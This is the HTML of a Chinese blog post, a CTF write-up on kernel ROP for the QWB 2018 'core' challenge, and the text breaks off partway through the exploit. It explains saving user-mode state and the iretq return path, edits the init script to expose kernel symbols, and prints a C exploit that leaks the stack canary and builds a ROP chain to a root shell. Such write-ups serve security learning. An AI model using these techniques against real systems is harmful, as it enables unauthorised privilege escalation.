@@ -1,0 +1,755 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon/icon.jpg">
+  <link rel="icon" href="/img/favicon/icon.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Eurus">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Kernel！主要是复现arttnba3大佬的博客*★,°*:.☆(￣▽￣)&#x2F;$:*.°★* 。 ps：这道题是在老爹请客的那天做的，做的时候不断犯病且现在写博客的时候记忆几乎为零，所以重做一遍当作整理和回忆（最近记忆力真的好差不知道为什么&#x2F;(ㄒoㄒ)&#x2F;~~）">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Kernel ROP basic">
+<meta property="og:url" content="http://akaieurus.github.io/2023/08/03/Kernel-ROP-basic/index.html">
+<meta property="og:site_name" content="Eurus禁止摆烂！">
+<meta property="og:description" content="Kernel！主要是复现arttnba3大佬的博客*★,°*:.☆(￣▽￣)&#x2F;$:*.°★* 。 ps：这道题是在老爹请客的那天做的，做的时候不断犯病且现在写博客的时候记忆几乎为零，所以重做一遍当作整理和回忆（最近记忆力真的好差不知道为什么&#x2F;(ㄒoㄒ)&#x2F;~~）">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://akaieurus.github.io/img/posts/pc23.jpg">
+<meta property="article:published_time" content="2023-08-03T09:03:47.000Z">
+<meta property="article:modified_time" content="2025-01-03T10:44:28.419Z">
+<meta property="article:author" content="Eurus">
+<meta property="article:tag" content="kernel">
+<meta property="article:tag" content="rop">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://akaieurus.github.io/img/posts/pc23.jpg">
+  
+  
+  
+  <title>Kernel ROP basic - Eurus禁止摆烂！</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"akaieurus.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Eurus&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/posts/pc23.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Kernel ROP basic"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-03 17:03" pubdate>
+          2023年8月3日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          12 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Kernel ROP basic</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>Kernel！主要是复现arttnba3大佬的博客*★,°*:.☆(￣▽￣)&#x2F;$:*.°★* 。</p>
+<p>ps：这道题是在老爹请客的那天做的，做的时候不断犯病且现在写博客的时候记忆几乎为零，所以重做一遍当作整理和回忆（最近记忆力真的好差不知道为什么&#x2F;(ㄒoㄒ)&#x2F;~~）</p>
+<span id="more"></span>
+
+<h1 id="Kernel-ROP-basic"><a href="#Kernel-ROP-basic" class="headerlink" title="Kernel ROP-basic"></a>Kernel ROP-basic</h1><p>整个提权的过程如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">状态保存-&gt;拿root权限-&gt;返回用户态-&gt;拿shell<br></code></pre></td></tr></table></figure>
+
+<h2 id="状态保存"><a href="#状态保存" class="headerlink" title="状态保存"></a>状态保存</h2><p>先了解一下用户态和内核态的切换过程</p>
+<h2 id="用户态→内核态"><a href="#用户态→内核态" class="headerlink" title="用户态→内核态"></a>用户态→内核态</h2><ul>
+<li>切换GS段寄存器：swapgs切换GS寄存器，</li>
+<li>保存用户态栈帧信息：记录rsp</li>
+<li>保存用户态寄存器信息：通过 push 保存各寄存器值到栈上，以便后续“着陆”回用户态</li>
+</ul>
+<h3 id="内核态→用户态"><a href="#内核态→用户态" class="headerlink" title="内核态→用户态"></a>内核态→用户态</h3><p>恢复用户空间信息</p>
+<ul>
+<li><p>swapgs指令恢复用户态GS寄存器</p>
+</li>
+<li><p>iretq恢复到用户空间，iretq栈布局如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">|----------------------|<br>| RIP                  |&lt;== low mem<br>|----------------------|<br>| CS                   |<br>|----------------------|<br>| RFLAGS               |<br>|----------------------|<br>| RSP                  |<br>|----------------------|<br>| SS                   |&lt;== high mem<br>|----------------------|<br></code></pre></td></tr></table></figure></li>
+</ul>
+<p>所以需要保存以下寄存器的值：eflags（状态标志寄存器）、cs（代码段寄存器）、rsp和ss（栈段寄存器）</p>
+<p>状态保存函数（使用内联汇编，编译时需指定参数-masm&#x3D;intel）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span> <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pushf;&quot;</span>	<span class="hljs-comment">//标志进栈指令，将标志寄存器的值压入堆栈顶部</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pop user_rflags;&quot;</span></span><br><span class="hljs-params">    )</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="拿root权限"><a href="#拿root权限" class="headerlink" title="拿root权限"></a>拿root权限</h2><p>通过构造ROP链执行函数commit_creds(prepare_kernel_cred(&amp;init_task))或commit_creds(&amp;init_cred)（老版本commit_creds(prepare_kernel_cred(NULL))）</p>
+<h2 id="返回用户态，拿shell"><a href="#返回用户态，拿shell" class="headerlink" title="返回用户态，拿shell"></a>返回用户态，拿shell</h2><p>根据👆iretq栈布局，ROP链的构造如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">↓   swapgs<br>    iretq<br>    user_shell_addr	<span class="hljs-comment">//system(&quot;/bin/sh&quot;)地址</span><br>    user_cs<br>    user_rflags<br>    user_sp<br>    user_ss<br></code></pre></td></tr></table></figure>
+
+<h2 id="例题：强网杯2018-core"><a href="#例题：强网杯2018-core" class="headerlink" title="例题：强网杯2018-core"></a>例题：强网杯2018-core</h2><h3 id="启动初始化脚本分析"><a href="#启动初始化脚本分析" class="headerlink" title="启动初始化脚本分析"></a>启动初始化脚本分析</h3><p>先看启动脚本，start.sh（更改过的）：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">qemu-system-x86_64 \<br>-m 256M \<br>-kernel ./bzImage \<br>-initrd  ./core.cpio \<br>-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \<br>--nographic \<br>-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 #\<br><span class="hljs-meta prompt_">#</span><span class="language-bash">-S -gdb tcp::1234</span><br></code></pre></td></tr></table></figure>
+
+<p>启动不起来的时候改一下分配的内存</p>
+<ul>
+<li>开启了KASLR保护（地址随机化）</li>
+</ul>
+<p>打包解包相关命令</p>
+<ul>
+<li><p>解包命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cpio -idmv &lt; core.cpio<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>打包命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">find . | cpio -o --format=newc &gt; ../../core.cpio<br></code></pre></td></tr></table></figure></li>
+</ul>
+<p>查看init文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span><br>mount -t proc proc /proc<br>mount -t sysfs sysfs /sys<br>mount -t devtmpfs none /dev<br>/sbin/mdev -s<br>mkdir -p /dev/pts<br>mount -vt devpts -o gid=4,mode=620 none /dev/pts<br>chmod 666 /dev/ptmx<br>cat /proc/kallsyms &gt; /tmp/kallsyms<br>echo 1 &gt; /proc/sys/kernel/kptr_restrict<br>echo 1 &gt; /proc/sys/kernel/dmesg_restrict<br>ifconfig eth0 up<br>udhcpc -i eth0<br>ifconfig eth0 10.0.2.15 netmask 255.255.255.0<br>route add default gw 10.0.2.2 <br>insmod /core.ko<br><br>poweroff -d 120 -f &amp;<br>setsid /bin/cttyhack setuidgid 1000 /bin/sh<br>echo &#x27;sh end!\n&#x27;<br>umount /proc<br>umount /sys<br><br>poweroff -d 0  -f<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>kptr_restrict<ul>
+<li>0：root和普通用户都可以读取内核符号地址（&#x2F;proc&#x2F;kallsyms接口）</li>
+<li>1：root用户有权限读取, 普通用户没有权限</li>
+<li>2：内核将符号地址打印为全0, root和普通用户都没有权限</li>
+</ul>
+</li>
+<li>但将kptr_restrict置为0还是不能读取内核符号地址，还需要将perf_event_paranoid置0</li>
+</ul>
+<p>更改后的init脚本（需要查看函数地址以便进行调试）如下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span><br>mount -t proc proc /proc<br>mount -t sysfs sysfs /sys<br>mount -t devtmpfs none /dev<br>/sbin/mdev -s<br>mkdir -p /dev/pts<br>mount -vt devpts -o gid=4,mode=620 none /dev/pts<br>chmod 666 /dev/ptmx<br>echo 0 &gt; /proc/sys/kernel/kptr_restrict			#更改<br>echo 1 &gt; /proc/sys/kernel/dmesg_restrict<br>echo 0 &gt; /proc/sys/kernel/perf_event_paranoid	#增加<br>cat /proc/kallsyms &gt; /tmp/kallsyms<br>ifconfig eth0 up<br>udhcpc -i eth0<br>ifconfig eth0 10.0.2.15 netmask 255.255.255.0<br>route add default gw 10.0.2.2 <br>insmod /core.ko<br><br>poweroff -d 120 -f &amp;<br>setsid /bin/cttyhack setuidgid 1000 /bin/sh<br>echo &#x27;sh end!\n&#x27;<br>umount /proc<br>umount /sys<br><br>poweroff -d 0  -f<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>开始时内核符号表被复制了一份到&#x2F;tmp&#x2F;kalsyms中，利用这个我们可以获得内核中所有函数的地址</li>
+<li>core.ko就是存在漏洞的内核模块</li>
+<li>改变权限前设置了定时关机poweroff -d 120 -f，调试的时候可以把时间改长（注释掉会启动不了，我也不知道为什么）</li>
+</ul>
+<h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><p>编译指令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc ./exploit.c -o exploit -static -masm=intel<br></code></pre></td></tr></table></figure>
+
+<p>分析过程就不写了，大佬博客里都有，只贴一个exp</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_POPFQ_RET 0xffffffff81a012da</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IRETQ_RET 0xffffffff813eb448</span><br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><br><span class="hljs-type">void</span> *commit_creds = <span class="hljs-literal">NULL</span>, *prepare_kernel_cred = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span><br>    <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pushf;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pop user_rflags;&quot;</span></span><br><span class="hljs-params">    )</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root_privilige</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">void</span> * (*prepare_kernel_cred_ptr)(<span class="hljs-type">void</span> *) = prepare_kernel_cred;<br>    <span class="hljs-type">int</span> (*commit_creds_ptr)(<span class="hljs-type">void</span> *) = commit_creds;<br>    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="hljs-literal">NULL</span>));<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root_shell</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(getuid())<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. &quot;</span><br>         <span class="hljs-string">&quot;Execve root shell now...\033[0m&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">core_read</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">char</span> * buf)</span><br>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889b</span>, buf);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_off</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">size_t</span> off)</span><br>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889c</span>, off);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">core_copy_func</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">size_t</span> nbytes)</span><br>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889a</span>, nbytes);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m\n&quot;</span>);<br>    save_status();<br><br>    <span class="hljs-type">int</span> fd;<br>    fd = open(<span class="hljs-string">&quot;/proc/core&quot;</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">if</span>(fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the /proc/core !\033[0m&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>    <br>    FILE *sym_table_fd = fopen(<span class="hljs-string">&quot;/tmp/kallsyms&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span>(sym_table_fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-type">size_t</span> addr;<br>    <span class="hljs-type">char</span> type[<span class="hljs-number">0x10</span>], buf[<span class="hljs-number">0x50</span>];<br>    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">fscanf</span>(sym_table_fd, <span class="hljs-string">&quot;%lx%s%s&quot;</span>, &amp;addr, type, buf))<br>    &#123;<br>        <span class="hljs-keyword">if</span>(prepare_kernel_cred &amp;&amp; commit_creds)<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">if</span>(!commit_creds &amp;&amp; !<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;commit_creds&quot;</span>))<br>        &#123;<br>            commit_creds = (<span class="hljs-type">void</span> *)addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the addr of &quot;</span><br>                   <span class="hljs-string">&quot;commit_cred:\033[0m%p\n&quot;</span>, commit_creds);<br>            <span class="hljs-keyword">continue</span>;            <br>        &#125;<br>        <span class="hljs-keyword">if</span>(!prepare_kernel_cred &amp;&amp; !<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;prepare_kernel_cred&quot;</span>))<br>        &#123;<br>            prepare_kernel_cred = (<span class="hljs-type">void</span> *)addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the addr of &quot;</span><br>                   <span class="hljs-string">&quot;prepare_kernel_cred:\033[0m%p\n&quot;</span>, prepare_kernel_cred);<br>            <span class="hljs-keyword">continue</span>;           <br>        &#125;<br>    &#125;<br><br>    <span class="hljs-type">size_t</span> offset;<br>    offset = (<span class="hljs-type">size_t</span>)commit_creds - <span class="hljs-number">0xffffffff8109c8e0</span>;<br><br>    <span class="hljs-type">size_t</span> canary;<br>    set_off(fd, <span class="hljs-number">64</span>);<br>    core_read(fd, buf);<br>    canary = ((<span class="hljs-type">size_t</span> *)buf)[<span class="hljs-number">0</span>];<br><br>    <span class="hljs-type">size_t</span> rop_chain[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">int</span> i;<br>    <span 